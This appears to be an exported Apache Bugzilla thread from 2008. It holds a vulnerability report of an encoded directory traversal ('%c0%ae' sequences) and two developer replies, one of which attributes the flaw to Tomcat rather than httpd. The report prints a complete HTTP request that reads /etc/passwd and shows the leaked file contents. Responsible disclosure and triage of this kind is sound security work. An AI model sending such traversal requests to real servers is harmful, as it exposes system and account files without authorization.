[{"count": 0, "tags": [], "creator": "bar4mi@gmail.com", "attachment_id": null, "id": 118748, "time": "2008-07-17T01:52:19Z", "bug_id": 45417, "creation_time": "2008-07-17T01:52:19Z", "is_private": false, "text": "-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\nDear Bugzilla\n\nI'm Simon Ryeo who is a computer security consultant in South Korea.\n(My main job is penetration testing.)\n\nI found a critical security problem on Apache 2.2.0. \nI'd like to find it's major reason but I don't have any time because of my\nproject.\nAlso, I couldn't test it on last version(2.2.9)\n\n[Overview]\nAn attacker can get important files(/etc/passwd, etc.) of the system using\nApache 2.2.0.\nHe can do it just using '%c0%ae%c0%ae' which means 'dot-dot-slash'. \nIt is just the encoded directory traversal attack.\n\n[Exploit]\nAn attacker just does request the wanted files with '%c0%ae%c0%ae'.\n\nGET\n/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0\n%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.0\nAccept: */*\nAccept-Language: ko-KR\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)\nHost: www.target.com\n\n\nHTTP/1.1 200 OK\nContent-Length: 1411\nDate: Mon, 14 Jul 2008 08:05:05 GMT\nServer: Apache\nLast-Modified: Sun, 06 Jul 2008 08:26:01 GMT\nConnection: close\nContent-Type: text/plain; charset=UTF-8\nContent-Language: ko\n\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\n...\n  \n\n[Environments]\nIt was rebuild with published apache 2.2.0 by user. He used below\nconfigurations and systems.\n\n1. build options\n./configure --prefix=/usr/local/httpd-2.2.0 --enable-proxy\n- --enable-module=so --disable-auth --enable-include --disable-env\n- --disable-autoindex --disable-cgi --disable-negotiation --disable-imap\n- --disable-actions --disable-userdir --enable-dos --enable-rewrite \n\n2. Operation System: Redhat Enterprise\n3. Apache Version: apache 2.2.0\n4. Httpd modules list \n     core.c\n     mod_auth_file.c\n     mod_authn_default.c\n     mod_authz_host.c\n     mod_authz_groupfile.c\n     mod_authz_user.c\n     mod_authz_default.c\n     mod_auth_basic.c\n     mod_include.c\n     mod_filter.c\n     mod_log_config.c\n     mod_setenvif.c\n     mod_proxy.c\n     mod_proxy_ftp.c\n     mod_proxy_http.c\n     mod_proxy_ajp.c\n     mod_proxy_balancer.c\n     prefork.c\n     http_core.c\n     mod_mime.c\n     mod_status.c\n     mod_asis.c\n     mod_dir.c\n     mod_alias.c\n     mod_rewrite.c\n     mod_so.c\n6. Additional modules\n     mod_jk.so (version 1.2.1.5)\n     mod_evasive20.so (version 1.10.1)\n\n\n[My additional contact information]\nbarami@ahnlab.com (Ahnlab, Inc.)\nbar4mi@apache-kr.org (The Apache Korea Group)\n\n-----BEGIN PGP SIGNATURE-----\nVersion: 9.8.3.4028\n\nwj8DBQFIfwYCzuoR/xLtCioRAoCIAJ4ti9JR1sKFYzgcarbptRnpFYytJACgkT57\nwqY9b4bRKkVwkEEQNlBZ1Cc=\n=RQMK\n-----END PGP SIGNATURE-----\n\n-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: 9.8.3.4028\n\n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\nZ9c=\n=JQcw\n-----END PGP PUBLIC KEY BLOCK-----"}, {"count": 1, "tags": [], "bug_id": 45417, "text": "1) what configuration is being used?  Please attach the httpd.conf\n2) please try removing the non-httpd modules:\n\n     mod_jk.so (version 1.2.1.5)\n     mod_evasive20.so (version 1.10.1)\n\nand see whether you can still reproduce this.", "id": 118749, "time": "2008-07-17T02:46:22Z", "creator": "jorton@redhat.com", "creation_time": "2008-07-17T02:46:22Z", "is_private": false, "attachment_id": null}, {"count": 2, "tags": [], "bug_id": 45417, "attachment_id": null, "id": 119306, "time": "2008-08-02T16:01:25Z", "creator": "wrowe@apache.org", "creation_time": "2008-08-02T16:01:25Z", "is_private": false, "text": "Note there is a workaround with the Tomcat 6.0.18 release of last week that\nwill allow you to use UTF8 URLs again, safely.  The flaw was on the Java side\nand not as you reported on the httpd side."}]